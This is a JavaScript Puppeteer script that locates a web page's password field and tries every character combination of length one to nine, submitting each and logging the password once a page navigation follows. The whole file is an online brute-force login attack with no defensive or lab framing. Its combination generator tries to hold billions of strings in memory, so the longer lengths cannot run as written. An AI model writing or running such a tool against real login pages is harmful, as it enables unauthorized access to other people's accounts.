const puppeteer = require('puppeteer');

const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+[]{}|;:,.<>?';

// Function to generate all possible combinations of a given length
function generateCombinations(length) {
    const combinations = [];
    const maxCombinations = Math.pow(chars.length, length);

    for (let i = 0; i < maxCombinations; i++) {
        let combination = '';
        let num = i;

        for (let j = 0; j < length; j++) {
            combination = chars[num % chars.length] + combination;
            num = Math.floor(num / chars.length);
        }

        combinations.push(combination);
    }

    return combinations;
}

(async () => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  // input url
  await page.goto('page url', { waitUntil: 'networkidle2' });

  // Identify the password-related input field
  const passwordDetails = await page.evaluate(() => {
    // Search for an input element containing "password" in its attributes
    const passwordInput = Array.from(document.querySelectorAll('input')).find(input => {
      const typeAttr = input.getAttribute('type') || '';
      const nameAttr = input.getAttribute('name') || '';
      const idAttr = input.getAttribute('id') || '';

      // Look for attributes containing "password"
      return typeAttr.includes('password') || nameAttr.includes('password') || idAttr.includes('password');
    });

    // If the element exists, return selector and additional details
    if (passwordInput) {
      return {
        selector: passwordInput.getAttribute('name') 
          ? `input[name="${passwordInput.getAttribute('name')}"]`
          : passwordInput.getAttribute('id') 
            ? `input#${passwordInput.getAttribute('id')}`
            : null,
        name: passwordInput.getAttribute('name') || null,
        id: passwordInput.getAttribute('id') || null,
        type: passwordInput.getAttribute('type') || null
      };
    }
    return null;
  });

  if (!passwordDetails || !passwordDetails.selector) {
    console.log('No password-related input found.');
    await browser.close();
    return;
  }

  console.log('Password-related selector found:', passwordDetails.selector);
  console.log('Additional Details:', passwordDetails);

  // Try all possible password combinations from length 1 to 9
  for (let length = 1; length <= 9; length++) {
    console.log(`\nTrying combinations of length: ${length}`);
    const generatedCombinations = generateCombinations(length);

    for (const password of generatedCombinations) {
      console.log('Trying password:', password);

      await page.type(passwordDetails.selector, password); // Use the found selector to type the password
      await page.click('button[type="submit"]');   // Click the submit button

      try {
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 3000 });
        console.log('Correct password found:', password);
        await browser.close();
        return;
      } catch {
        console.log('Incorrect password:', password);
        await page.evaluate(selector => {
          document.querySelector(selector).value = '';
        }, passwordDetails.selector); // Clear the password field for the next attempt
      }
    }
  }

  console.log('All combinations tried, but no password was found.');
  await browser.close();
})();
